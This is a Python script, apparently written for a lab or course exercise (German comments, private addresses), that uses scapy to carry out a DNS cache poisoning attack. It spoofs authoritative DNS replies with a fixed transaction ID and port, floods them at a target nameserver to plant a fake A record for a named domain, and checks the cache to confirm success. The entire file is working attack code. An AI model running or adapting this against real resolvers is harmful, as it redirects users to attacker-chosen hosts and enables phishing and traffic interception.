#! /usr/bin/env python
#from scapy.all import IP, UDP, DNS, sendpfast, send, DNSQR
from scapy.all import *
import threading, socket

bad_guy = '192.168.1.249' # unsere ip addresse (fuer anfrage)
fake_ip = '195.71.11.67' # das was wir dem cache infizieren wollen

victim_url = 'danielfett.de'  # url dessen cache gepoisened werden soll
victim_ns = '192.168.1.2'     # nameserver der angegeriffen wird
fix_dns_id = 0x0042
fix_port = 32772
dns_ttl = 60*60*24*15 

dns_qd=DNSQR(qname=victim_url,qtype='A',qclass='IN')        # querry data fuer die anfrage
dns_qd_ns=DNSQR(qname=victim_url,qtype='NS',qclass='IN')    # querry data fuer die zone_ns anfrage

#dynamisch ermittelt:
global zone_ns           # nameserver_ip von victim_url
global zone_ns_url       # url von zone_ns

def sendRequest():
    
    set_ns(victim_url)
    
    while ( True ):
        request = Ether()/IP(dst=victim_ns,src=bad_guy,flags=2)/UDP(dport=53,sport=53)/DNS(id=1337,qr=0,rd=1,qd=dns_qd)
        dns = Ether()/IP(dst=victim_ns, src=zone_ns)/UDP(dport=fix_port, sport=53)/DNS(id=fix_dns_id, rd=1, qr=1, aa=1, qd=dns_qd, an = DNSRR(type='A',rrname=victim_url, ttl=dns_ttl, rdata=fake_ip) )
        pkt_list=[]
        pkt_list.append(request)
        print 'Cache Poisoning auf '+victim_url+' ...'
        for i in range(100):
            pkt_list.append(dns)

        sendpfast(pkt_list, loop=0, pps=250)

        cache = check_cache()
        if cache==0:
            print 'Angriff noch nicht erfolgreich, kein cache'
        if cache==1:
            print '1. Angriff erfolgreich'
            print '2. ???'
            print '3. Profit!!!'
            break
        if cache==2:
            print 'Angriff nicht moeglich, korrekte IP gecached'
            break

    	"""Send packets at layer 2 using tcpreplay for performance
    pps:  packets per second
    mbps: MBits per second
    realtime: use packet's timestamp, bending time with realtime value
    loop: number of times to process the packet list
    file_cache: cache packets in RAM instead of reading from disk at each iteration
    iface: output interface """

	      
def set_ns(url):
    global zone_ns
    global zone_ns_url
    #return 0 falls wenn nichts im Cache
    #return 1 falls der Cache erfolgreich vergiftet wurde
    #return 2 falls bereits ein Cache eintrag vorliegt
    antwort_pkt =sr1( IP(dst=victim_ns,src=bad_guy,flags=2)/UDP(dport=53,sport=53)/DNS(id=1337,qr=0,qd=dns_qd_ns, rd=1) )
    adns=antwort_pkt.getlayer(DNS)
    #adns.show()
    if adns.ar != None:
        for f in adns.ar:            
            zone_ns = f.rdata
            print zone_ns
            zone_ns_url = f.rrname
            print zone_ns_url
            return True
	      
def check_cache():
    #return 0 falls wenn nichts im Cache
    #return 1 falls der Cache erfolgreich vergiftet wurde
    #return 2 falls bereits ein Cache eintrag vorliegt
    antwort_pkt =sr1( IP(dst=victim_ns,src=bad_guy,flags=2)/UDP(dport=53,sport=53)/DNS(id=1337,qr=0,qd=dns_qd, rd=0) )
    adns=antwort_pkt.getlayer(DNS)
    #adns.show()
   
    if adns.an != None:
        if(adns.an.rdata==fake_ip):  
            print "Cache erfolgreich vergiftet. IP = "+adns.an.rdata      
            return 1
        else:
            print "Cache Eintrag liegt bereits vor. IP = "+adns.an.rdata
            return 2
    else:
        print "Cache ist leer"
        return 0


if __name__ == '__main__':
    sendRequest()
    #check_cache()


